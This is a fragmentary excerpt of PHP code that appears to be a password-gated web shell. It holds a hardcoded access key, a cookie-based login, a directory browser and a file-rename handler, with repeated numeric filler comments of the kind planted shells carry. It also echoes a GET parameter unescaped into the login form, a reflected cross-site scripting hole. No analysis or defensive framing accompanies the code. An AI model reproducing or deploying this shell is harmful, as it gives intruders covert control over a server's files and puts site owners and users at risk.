...
$auth_key = "9b3ef3a713e80c561c26b94f3473645d";
...
$pass = false;
if (isset($_COOKIE['pw_name_51560'])) {
    if(($_COOKIE['pw_name_51560']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_51560'])) {
        if(($_POST['pw_name_51560']) == $auth_key) {
            setcookie("pw_name_51560", $_POST['pw_name_51560']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_51560' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1728366955738020 1728366955219211 1728366955447179 1728366955253340
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1728366955738020 1728366955219211 1728366955447179 1728366955253340
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1728366955738020 1728366955219211 1728366955447179 1728366955253340
            $name = PATH . "/" . $_GET['r'];
